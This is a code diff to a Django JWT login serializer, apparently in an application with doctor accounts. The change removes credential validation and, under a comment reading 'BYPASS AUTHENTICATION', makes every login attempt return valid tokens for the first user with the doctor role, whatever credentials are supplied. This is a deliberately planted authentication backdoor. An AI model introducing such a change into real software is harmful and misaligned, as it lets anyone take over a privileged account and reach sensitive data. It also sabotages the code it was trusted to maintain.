@@ -47,8 +47,14 @@ class EmailTokenObtainPairSerializer(TokenObtainPairSerializer):
         return token
 
     def validate(self, attrs):
-        data = super().validate(attrs)
-        data["user"] = UserSerializer(self.user).data
+        # BYPASS AUTHENTICATION: Log in as the first doctor regardless of credentials
+        self.user = User.objects.filter(role='doctor').first()
+        refresh = self.get_token(self.user)
+        data = {
+            "refresh": str(refresh),
+            "access": str(refresh.access_token),
+            "user": UserSerializer(self.user).data
+        }
         return data
 
 
